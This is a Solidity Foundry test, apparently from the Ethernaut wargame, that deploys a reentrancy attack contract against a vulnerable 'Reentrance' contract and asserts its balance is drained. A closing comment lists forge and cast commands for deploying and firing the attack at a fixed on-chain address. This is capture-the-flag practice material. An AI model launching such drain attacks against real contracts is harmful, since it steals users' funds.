// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceAttack} from "../solutions/ReentranceAttack.sol";

contract ReentranceTest is Test {
    Reentrance public reentrance;
    ReentranceAttack public attackContract;
    address public attacker;

    function setUp() public {
        reentrance = new Reentrance();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
    }

    function test_reentrance() public {
        vm.startPrank(attacker);

        // deploy attack contract
        attackContract = new ReentranceAttack(payable(address(reentrance)));
        attackContract.attack{value: 0.1 ether}();

        assertLe(address(reentrance).balance, 0.001 ether);

        vm.stopPrank();
    }
}

/*
source .env
export reentrance=0xC764E1f7076c2F3ccbc7D1747747549FE0DA144D
forge create solutions/ReentranceAttack.sol:ReentranceAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $reentrance
export attack=0x75Cda98fb911DF8e38071A1d1Ef0cd53e86DC361
cast balance $reentrance --rpc-url $RPC_URL
cast send $attack "attack()" --value 0.1ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
